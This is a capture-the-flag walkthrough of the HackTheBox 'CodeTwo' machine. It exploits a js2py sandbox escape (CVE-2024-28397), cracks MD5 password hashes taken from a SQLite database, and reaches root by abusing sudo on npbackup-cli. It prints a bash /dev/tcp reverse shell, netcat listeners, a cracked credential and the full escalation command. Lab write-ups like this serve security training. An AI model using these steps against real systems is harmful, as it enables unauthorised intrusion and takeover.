# HackTheBox - CodeTwo
OS: Linux
Difficulty: Easy

## Recon
Nmap revealed an open HTTP service on 8080.

The application on 8080 is the XWiki default page

## Web page

On the main page we can download app's code. In the app.py the `js2py` module is imported.

This module is used in the `/dashboard` page where there is a sandbox where we can run javascript code.

## CVE-2024-28397

From here, the RCE is obvious, see CVE-2024-28397 (https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape).

Start a listenner :
```bash
nc -lnvp <PORT>
```

I tried to execute the payload on the site, without success.

So, let's do it with a python script (see [cve.py](cve.py)).


## Inside the machine

1. Explore current directory :
```bash
ls
# app.py instance requirements.txt static templates
```

2. Discover instance/users.db

```bash
sqlite3 instance/users.db
```

```sql
.table
# output example:
# code_snippet  user

select * from users;
# output example:
# 1|marco|649c9d65a206a75f5abe509fe128bce5
# 2|app|a97588c0e2fa3a024876339e27aeb42e
# 3|alessandro|5f4dcc3b5aa765d61d8327deb882cf99
```

3. Crack marco's hash (raw MD5)

Prepare hash file:
```text
marco:649c9d65a206a75f5abe509fe128bce5
```

And run john :
```bash
john --wordlist=/path/to/rockyou.txt hash.txt -format=raw-md5
# sweetangelbabylove (marco)
```

4. Then connect to this user :
```bash
ssh marco@10.10.11.82
```

## Privilege escalation to root
1. Check marco's sudo permissions:
```bash
sudo -l
# User marco may run the following commands on codeparttwo:
#     (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

1. Write simple revshell at `/tmp/exploit.sh`:
```bash
#!/bin/bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

2. Add executable permission using `chmod +x /tmp/exploit.sh`.

3. Start a listenner on your machine :
```bash
nc -lnvp <PORT>
```

4. Run on the target :
```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --external-backend-binary=/tmp/exploit.sh --backup
```

5. Enjoy your root shell